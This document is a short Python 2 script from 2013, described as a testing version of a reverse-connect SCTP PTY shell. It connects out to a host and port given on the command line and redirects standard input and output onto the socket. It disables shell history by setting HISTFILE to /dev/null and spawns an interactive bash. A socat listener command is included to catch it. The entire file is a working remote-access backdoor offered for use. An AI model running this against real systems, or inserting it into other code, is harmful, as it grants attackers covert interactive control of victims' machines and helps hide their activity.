#!/usr/bin/python2
"""
Reverse Connect SCTP PTY Shell - testing version
infodox - insecurety.net (2013)

For an excellent listener use the following socat command:
socat file:`tty`,echo=0,raw sctp-listen:PORT

Alternatively, use sctp_pty_shell_handler.py 
"""
import os
import pty
import sys
import socket
from sctp import *

def main():
    if len(sys.argv) < 3:
      print("Usage:\n  " + sys.argv[0] + " <ip> <port>\n")
      exit(1)

    rhost = str(sys.argv[1])
    rport = int(sys.argv[2])
    s = sctpsocket_tcp(socket.AF_INET)
    s.connect((rhost, rport))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    os.putenv("HISTFILE",'/dev/null')
    pty.spawn("/bin/bash")
    s.close()
	
if __name__ == "__main__":
    main()
